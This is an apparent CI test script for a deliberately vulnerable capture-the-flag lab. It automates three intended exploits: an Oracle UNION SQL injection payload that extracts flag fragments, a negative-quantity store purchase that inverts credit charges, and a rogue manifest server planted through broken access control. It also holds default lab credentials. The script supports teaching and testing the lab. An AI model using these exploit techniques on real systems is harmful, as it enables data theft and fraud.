#!/usr/bin/env python3
"""
End-to-end challenge test for OracleSecLab (LAB / CI ONLY).

Drives all three intended vulnerabilities through the real HTTP endpoints of a
running stack (Docker Compose) and asserts each one still yields a well-formed
DBS401{...} flag. It never hard-codes flag values, so it keeps passing when the
flags are generated per-instance.

  Challenge 1  Oracle UNION SQL injection in search.php  -> assemble 3 fragments
  Challenge 2  negative-quantity logic flaw in store.php -> unlock flag item
  Challenge 3  broken access control + manifest poisoning -> admin update flag

Usage (defaults target a local `docker compose up` stack):
  python tests/e2e_challenges.py
Environment overrides:
  TARGET_BASE    default http://localhost:8080/dbs401-oracle-app
  PARTNER_BASE   default http://localhost:8081
  ATTACKER_HOST  default host.docker.internal   (how the web container reaches us)
  ATTACKER_PORT  default 9000
  STUDENT_USER/STUDENT_PASS/ADMIN_USER/ADMIN_PASS
"""
from __future__ import annotations

import base64
import html
import http.server
import json
import os
import re
import sys
import threading
import time
from urllib.parse import quote

import requests

TARGET = os.environ.get("TARGET_BASE", "http://localhost:8080/dbs401-oracle-app").rstrip("/")
PARTNER = os.environ.get("PARTNER_BASE", "http://localhost:8081").rstrip("/")
ATTACKER_HOST = os.environ.get("ATTACKER_HOST", "host.docker.internal")
ATTACKER_PORT = int(os.environ.get("ATTACKER_PORT", "9000"))
STUDENT_USER = os.environ.get("STUDENT_USER", "student1")
STUDENT_PASS = os.environ.get("STUDENT_PASS", "Student@123")
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "Admin@DBS401!2024")

FLAG_RE = re.compile(r"DBS401\{[^}]+\}")
TIMEOUT = 15


def log(msg: str) -> None:
    print(msg, flush=True)


def login(session: requests.Session, user: str, password: str) -> bool:
    r = session.post(f"{TARGET}/login.php", data={"username": user, "password": password},
                     allow_redirects=True, timeout=TIMEOUT)
    return r.status_code == 200 and "Invalid username" not in r.text


def wait_for_stack(max_seconds: int = 900) -> None:
    """Block until the DB is seeded and a normal student can log in."""
    log(f"[*] Waiting for stack at {TARGET} (up to {max_seconds}s) ...")
    deadline = time.time() + max_seconds
    while time.time() < deadline:
        try:
            s = requests.Session()
            if login(s, STUDENT_USER, STUDENT_PASS):
                log("[+] Stack is up and seeded.")
                return
        except requests.RequestException:
            pass
        time.sleep(5)
    raise SystemExit("[FATAL] Stack did not become ready in time.")


# ---- cell extraction from search.php results ---------------------------------

def union_cell(session: requests.Session, expr: str, where: str) -> str:
    """Return the value of `expr` from `where` via a UNION injection in ?q=.
    search.php selects (student_id NUMBER, full_name VARCHAR, major VARCHAR);
    we place our value in the second (VARCHAR) column."""
    payload = f"zzzno%') UNION SELECT 1, {expr}, 'x' FROM {where}--"
    r = session.get(f"{TARGET}/search.php", params={"q": payload}, timeout=TIMEOUT)
    r.raise_for_status()
    cells = re.findall(r"<td>(.*?)</td>", r.text, re.S)
    # second column of the injected row carries our value; return the longest cell
    vals = [html.unescape(c.strip()) for c in cells if c.strip()]
    if not vals:
        raise AssertionError("UNION injection returned no cells (SQLi may be broken)")
    return max(vals, key=len)


# ---- Challenge 1 -------------------------------------------------------------

def challenge1(session: requests.Session) -> str:
    log("[*] Challenge 1: Oracle UNION SQL injection ...")
    part_a_hex = union_cell(session, "flag_part", "FLAGS WHERE flag_code='FL1_PART_A'")
    meta = union_cell(session, "metadata_note", "AUDIT_LOGS WHERE action='SYSTEM_AUDIT_CHECK'")
    part_c_b64 = union_cell(session, "config_value", "CONFIG_STORE WHERE config_key='sys_alpha_marker'")

    a = bytes.fromhex(part_a_hex.strip()).decode()
    frag = json.loads(meta).get("fragment", "")
    b = frag[::-1]  # Part B is stored reversed
    c = base64.b64decode(part_c_b64.strip()).decode()
    flag = a + b + c
    log(f"    part A (hex)     -> {a}")
    log(f"    part B (reverse) -> {b}")
    log(f"    part C (base64)  -> {c}")
    assert FLAG_RE.fullmatch(flag), f"assembled flag malformed: {flag!r}"
    log(f"[+] Challenge 1 flag: {flag}")
    return flag


# ---- Challenge 2 -------------------------------------------------------------

def challenge2(session: requests.Session) -> str:
    log("[*] Challenge 2: negative-quantity credit manipulation ...")
    # item 1 costs 100 credits; a large negative quantity inverts the deduction.
    r = session.post(f"{TARGET}/store.php",
                     data={"buy": "1", "item_id": "1", "quantity": "-10000"},
                     allow_redirects=True, timeout=TIMEOUT)
    m = FLAG_RE.search(r.text)
    if not m:
        # re-fetch in case the flag renders on a subsequent load
        m = FLAG_RE.search(session.get(f"{TARGET}/store.php", timeout=TIMEOUT).text)
    assert m, "store.php did not reveal a flag after the exploit"
    log(f"[+] Challenge 2 flag: {m.group(0)}")
    return m.group(0)


# ---- Challenge 3 -------------------------------------------------------------

class _Manifest(http.server.BaseHTTPRequestHandler):
    payload = b"{}"

    def do_GET(self):  # noqa: N802
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(self.payload)))
        self.end_headers()
        self.wfile.write(self.payload)

    def log_message(self, *a):  # silence
        return


def challenge3(student: requests.Session) -> str:
    log("[*] Challenge 3: broken access control + manifest poisoning ...")
    # The genuine first-half hex is public in the baseline manifest; a solver
    # reuses it and only bumps the version. This mirrors the intended attack
    # and stays correct when the flag is generated per-instance.
    base = requests.get(f"{PARTNER}/manifest.json", timeout=TIMEOUT).json()
    flag_part = base["flag_part"]
    _Manifest.payload = json.dumps({
        "version": "9.9.9", "status": "critical", "checksum": "ci", "flag_part": flag_part,
    }).encode()

    server = http.server.ThreadingHTTPServer(("0.0.0.0", ATTACKER_PORT), _Manifest)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        rogue_url = f"http://{ATTACKER_HOST}:{ATTACKER_PORT}/manifest.json"
        r = student.post(f"{TARGET}/partner_config.php",
                         data={"manifest_url": rogue_url}, allow_redirects=True, timeout=TIMEOUT)
        assert ("updated successfully" in r.text.lower() or rogue_url in r.text), \
            "partner_config.php did not accept the poisoned URL (access control may be fixed)"

        admin = requests.Session()
        assert login(admin, ADMIN_USER, ADMIN_PASS), "admin login failed"
        r = admin.get(f"{TARGET}/admin.php", params={"check_updates": "1"}, timeout=TIMEOUT)
        m = FLAG_RE.search(r.text)
        assert m, "admin update did not reveal a flag"
        log(f"[+] Challenge 3 flag: {m.group(0)}")
        return m.group(0)
    finally:
        server.shutdown()


def main() -> int:
    wait_for_stack()
    results: dict[str, bool] = {}
    student = requests.Session()
    if not login(student, STUDENT_USER, STUDENT_PASS):
        raise SystemExit("[FATAL] student login failed")

    for name, fn in (("Challenge 1", lambda: challenge1(student)),
                     ("Challenge 2", lambda: challenge2(student)),
                     ("Challenge 3", lambda: challenge3(student))):
        try:
            fn()
            results[name] = True
        except Exception as e:  # noqa: BLE001
            results[name] = False
            log(f"[FAIL] {name}: {e}")

    log("\n==================== E2E RESULTS ====================")
    for name, ok in results.items():
        log(f"  {name}: {'PASS' if ok else 'FAIL'}")
    log("====================================================")
    return 0 if all(results.values()) else 1


if __name__ == "__main__":
    sys.exit(main())
